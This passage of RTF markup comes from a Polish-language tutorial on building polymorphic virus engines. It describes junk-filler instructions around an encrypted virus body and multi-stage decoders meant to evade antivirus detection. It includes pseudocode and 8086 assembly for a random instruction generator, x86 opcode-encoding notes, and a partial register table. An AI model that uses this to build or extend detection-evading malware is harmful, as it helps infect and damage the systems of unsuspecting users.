\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch druga instrukcja dekodera }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch n-ta instrukcja dekodera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch sprawdzenie warunku zako\uc1\u324\'f1czenia p\uc1\u281\'eatli }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch skok, je\uc1\u380\'bfeli warunek spe\uc1\u322\'b3niony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch w\uc1\u322\'b3a\uc1\u347\'9cciwy, zaszyfrowany }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch kod wirusa, do kt\'f3rego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch zostanie przekazane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch sterowanie po rozkodowaniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przeprowadzaj\uc1\u261\'b9c kilkakrotnie powy\uc1\u380\'bfsze operacje mo\uc1\u380\'bfna uzyska\uc1\u263\'e6 kilkustopniow\uc1\u261\'b9 procedur\uc1\u281\'ea dekodera, kt\'f3ra b\uc1\u281\'eadzie bardzo trudna do wy}{\f1\fs24\lang1045{\*\listtag0}krycia przez programy antywirusowe.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby przyspieszy\uc1\u263\'e6 wykonywanie procedury dekoduj\uc1\u261\'b9cej, cz\uc1\u281\'easto szyfruje si\uc1\u281\'ea ca\uc1\u322\'b3y kod wirusa jak\uc1\u261\'b9\uc1\u347\'9c sta\uc1\u322\'b3\uc1\u261\'b9 procedur\uc1\u261\'b9, a dopiero ta jest roz-kodowywana za pomoc\uc1\u261\'b9 zmiennej procedury deszyfruj\uc1\u261\'b9cej, kt\'f3rej wystarcza na rozkodowanie kilkakrotne wykonanie p\uc1\u281\'eatli dekodera. Innym sposobem mo\uc1\u380\'bfe by\uc1\u263\'e6 tu ca\uc1\u322\'b3kowite pomini\uc1\u281\'eacie p\uc1\u281\'eatli i stworzenie kodu, kt\'f3ry wygeneruje w\uc1\u322\'b3a\uc1\u347\'9cciw\uc1\u261\'b9, sta\uc1\u322\'b3\uc1\u261\'b9 procedur\uc1\u281\'ea dekoduj\uc1\u261\'b9ca w locie, buduj\uc1\u261\'b9c odpowiednie jej instrukcje z odpowiednich fragment\'f3w rozrzuconych po kod}{\f1\fs24\lang1045{\*\listtag0}zie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej zebrano informacje o wszystkich znanych instrukcjach procesor\'f3w 80x86 (kieruj\uc1\u261\'b9c si\uc1\u281\'ea ich przydatno\uc1\u347\'9cci\uc1\u261\'b9 do wykorzystania w generatorze).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Lista nie zawiera rozkaz\'f3w koprocesora, rozkaz\'f3w systemowych oraz instrukcji wykorzystywanych przez j\uc1\u281\'eazyki wy}{\f1\fs24\lang1045{\*\listtag0}sokiego poziomu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (nie s\uc1\u261\'b9 one wykorzystywane przez generatory polimorficzne). Opr\'f3cz kod\'f3w instrukcji podano opis sposobu zapisywania adres\'f3w za pomoc\uc1\u261\'b9 bajtu MmRejMem (286+) i SIB (386+).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacje podane poni\uc1\u380\'bfej dotycz\uc1\u261\'b9 dzia\uc1\u322\'b3ania instrukcji w trybie rzeczywistym procesora, a wi\uc1\u281\'eac adresowania segment\'f3w o rozmiarze maksymalnym 64k. W przypadku trybu chronionego i segment\'f3w wi\uc1\u281\'eakszych ni\uc1\u380\'bf 64k (najcz\uc1\u281\'ea\uc1\u347\'9cciej 4G, czyli model FLAT) nale\uc1\u380\'bfy wzi\uc1\u261\'b9\uc1\u263\'e6 pod uwag\uc1\u281\'ea, i\uc1\u380\'bf dzia\uc1\u322\'b3anie przedrostk\'f3w 66 i 67 ma w nich odmienne znaczen}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}e. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli chcemy wygenerowa\uc1\u263\'e6 rozkaz zerowania rejestru AX (MOV AX/0), nale\uc1\u380\'bfy dla segmentu zadeklarowanego z dyrektyw\uc1\u261\'b9 USE16 umie\uc1\u347\'9cci\uc1\u263\'e6 w buforze ci\uc1\u261\'b9g B8, 00, 00, za\uc1\u347\'9c dla segmentu zadeklarowanego z dyrektyw\uc1\u261\'b9 USE32 u\uc1\u380\'bfy\uc1\u263\'e6 sekwencji 66, B8, OO, 00. }{\f1\fs24\lang1045{\*\listtag0}C}{\f0\fs24\lang1045{\*\listtag0}hc\uc1\u261\'b9c natomiast zerowa\uc1\u263\'e6 rejestr EAX (MOV EAX/0), nale\uc1\u380\'bfy dla segmentu USE16 u\uc1\u380\'bfy\uc1\u263\'e6 sekwencji 66, B8, 00, 00, 00, 00, a dla segmentu USE32 - B8, 00, 00, 00, 00. Jak wida\uc1\u263\'e6, przedrostki 66 i 67 s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9 do wymuszania trybu interpretowania instrukcji, odmiennego od }{\f1\fs24\lang1045{\*\listtag0}t}{\f0\fs24\lang1045{\*\listtag0}ego kt\'f3rego u\uc1\u380\'bfywa procesor w danym trybie. W trybie rzeczywistym wymusza on instrukcje 32-bitowe, w chronionym za\uc1\u347\'9c 16-bitowe.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf instrukcje cz\uc1\u281\'easto zawieraj\uc1\u261\'b9 argumenty w postaci kilku bit\'f3w umieszczonych w r\'f3\uc1\u380\'bfnych miejscach, wszystkie kody instrukcji zawarte poni\uc1\u380\'bfej wyst\uc1\u281\'eapuj\uc1\u261\'b9 jako liczby binarne.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dzia\uc1\u322\'b3anie procedury generuj\uc1\u261\'b9cej wype\uc1\u322\'b3niacz mo\uc1\u380\'bfe wygl\uc1\u261\'b9da\uc1\u263\'e6 mniej wi\uc1\u281\'eacej tak:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch N:=LiczbaPseudolosowa }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch For I:=1 to N do GenerujInstrukcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Liczba N okre\uc1\u347\'9cla, ile instrukcji zostanie wygenerowanych podczas jednego wywo\uc1\u322\'b3ania procedury.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Procedura GenerujInstrukcj\uc1\u281\'ea powinna wybra\uc1\u263\'e6 (np. z tablicy) pierwszy bajt instrukcji i zapisa\uc1\u263\'e6 j\uc1\u261\'b9 do bufora, a nast\uc1\u281\'eapnie, o ile to konieczne, doda\uc1\u263\'e6 wymagane operandy. Podczas wybierania argument\'f3w instrukcji nale\uc1\u380\'bfy sprawdza\uc1\u263\'e6 czy wylosowany, przypadkowy argument nie koliduje w jaki\uc1\u347\'9c spos\'f3b z u\uc1\u380\'bfywanymi przez dekoder rejestrami. Je\uc1\u380\'bfeli tak jest, procedur\uc1\u281\'ea wybierania argumentu nale\uc1\u380\'bfy kontynuowa\uc1\u263\'e6, a\uc1\u380\'bf do znalezienia odpowiedniego argumentu. Procedura GenerujInstrukcj\uc1\u281\'ea powinna wygl\uc1\u261\'b9da\uc1\u263\'e6 mniej wi\uc1\u281\'eacej tak (zapisana w pseudoj\uc1\u281\'eazyku, troch\uc1\u281\'ea podobnym do Pascala):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch procedur\uc1\u281\'ea GenerujInstrukcj\uc1\u281\'ea;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch X:=LiczbaPseudolosowa wybieraj\uc1\u261\'b9ca generowana instrukcj\uc1\u281\'ea sprawd\uc1\u378\'9f atrybuty instrukcji wskazywanej przez X}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch if s\uc1\u261\'b9 jakie\uc1\u347\'9c operandy then}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    dla ka\uc1\u380\'bfdego operandu begin    }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       repeat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          arg:=Pseudolosowa       }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          if arg nie koliduje z zasobami dekodera to argument znaleziony    }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       untii argument znaleziony lub furtka bezpiecze\uc1\u324\'f1stwa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    wstaw operand=arg end else wstaw instrukcj\uc1\u281\'ea bez operand\'f3w;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Za\uc1\u322\'b3\'f3\uc1\u380\'bfmy, i\uc1\u380\'bf dla dekodera zosta\uc1\u322\'b3y wybrane:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch [Mem, cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 bajtu MrnRejMem, w tym przypadku [BX+SI] \} }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Indeks:= 000             ;\{Rejestr: z przedzia\uc1\u322\'b3u 000.. 111\} }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Licznik:= 001            ;\{trzeba zdekodowa\uc1\u263\'e6 u\uc1\u380\'bfywane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; przez indeks dwa rejestry, w tym                                     }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; przypadku oczywi\uc1\u347\'9ccie r\uc1\u281\'eacznie \} }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IndeksModyf1:= 110       ; [numer rejstru SI\} }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IndeksModyf2:= 011       ; (numer rejestru BX\}}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Niech procedura GenerujInstrukcje wybierze teraz do wstawienia np. rozkaz DEC, kt\'f3ry w tabeli jest zapisany jako:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01001Rej       DEC rejestr Rej.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wida\uc1\u263\'e6, instrukcja ta posiada parametr Rej, w tym przypadku rejestr 16 - lub 32 - bitowy. Za\uc1\u322\'b3\'f3\uc1\u380\'bfmy, i\uc1\u380\'bf rejestr jest 16-bitowy. Zapisana w asemblerze sekwencja szukaj\uc1\u261\'b9ca operandu dla instrukcji powinna wygl\uc1\u261\'b9da\uc1\u263\'e6 mniej wi\uc1\u281\'eacej tak:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajArgumentu:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,7 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Call RandomAX               ; we\uc1\u378\'9f liczb\uc1\u281\'ea z przedzia\uc1\u322\'b3u 000...111}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                 ; liczba w AL (bo AH-0)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp AL,IndeksModyfl         ; czy rejestr zaj\uc1\u281\'eaty przez \tab \tab             }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                             ; pierwsza cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 indeksu ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je SzukajArgumentu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp AL, IndeksModyf2        ; czy rejestr zaj\uc1\u281\'eaty przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                 ; druga cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 indeksu ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je SzukajArgumentu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp AL, Licznik             ; czy rejestr zaj\uc1\u281\'eaty przez licznik ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je SzukajArgumentu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp AL,100b                 ; czy rejestr to SP ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je SzukajArgumentu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                 ; argument znaleziony i jest w AL \tab \tab                         }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                             ; AL=00000arg - argument na trzech}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                 ; m\uc1\u322\'b3odszych bitach }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch or al, 01001000b             ; zsumuj logicznie z 5 bitami kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                 ; operacj i DEC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch stosb                        ; zapisz ca\uc1\u322\'b3a instrukcj\uc1\u281\'ea DEC arg do bufora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Post\uc1\u281\'eapuj\uc1\u261\'b9c w podobny spos\'f3b mo\uc1\u380\'bfna rozszerzy\uc1\u263\'e6 generator o wszystkie mo\uc1\u380\'bfliwe do wykorzystania, opisane dalej instrukcje.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W opisie instrukcji przyj\uc1\u281\'eato nast\uc1\u281\'eapuj\uc1\u261\'b9ce oznaczenia:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Rej - okre\uc1\u347\'9cla rejestr bior\uc1\u261\'b9cy udzia\uc1\u322\'b3 w operacji; rodzaj rejestru (8-, 16-, czy 32-bitowy) jest okre\uc1\u347\'9clany na podstawie bitu D (je\uc1\u380\'bfeli ten istnieje w instrukcji) oraz w zale\uc1\u380\'bfno\uc1\u347\'9cci od tego, czy przed instrukcj\uc1\u261\'b9 wyst\uc1\u261\'b9-pi\uc1\u322\'b3 przedrostek 66. Je\uc1\u380\'bfeli D=0, to rejestr jest 8-bitowy; je\uc1\u380\'bfeli przedrostek nie wyst\uc1\u261\'b9pi\uc1\u322\'b3 i D=0, to 16-bitowy, w innym wypadku jest on}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}32-bitowy. Warto\uc1\u347\'9cci przypisane poszczeg\'f3lnym rejestrom s\uc1\u261\'b9 nast\uc1\u281\'eapuj\uc1\u261\'b9ce:}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.8154in/0.7036in/0.7036in/0.7036in/0.7036in/0.7036in/0.7036in/0.7036in/0.7036in/; table-sdh:89883f0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx2131\clvertalt\cltxlrtb    \cellx3144\clvertalt\cltxlrtb    \cellx4158\clvertalt\cltxlrtb    \cellx5171\clvertalt\cltxlrtb    \cellx6184\clvertalt\cltxlrtb    \cellx7197\clvertalt\cltxlrtb    \cellx8210\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rej}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx2131\clvertalt\cltxlrtb    \cellx3144\clvertalt\cltxlrtb    \cellx4158\clvertalt\cltxlrtb    \cellx5171\clvertalt\cltxlrtb    \cellx6184\clvertalt\cltxlrtb    \cellx7197\clvertalt\cltxlrtb    \cellx8210\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}8-bitowe}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AL.}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CL}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DL}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BL}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AH}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CH  }\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DH}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BH}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx2131\clvertalt\cltxlrtb    \cellx3144\clvertalt\cltxlrtb    \cellx4158\clvertalt\cltxlrtb    \cellx5171\clvertalt\cltxlrtb    \cellx6184\clvertalt\cltxlrtb    \cellx7197\clvertalt\cltxlrtb    \cellx8210\clvertalt\cltxlrtb    \cellx9224
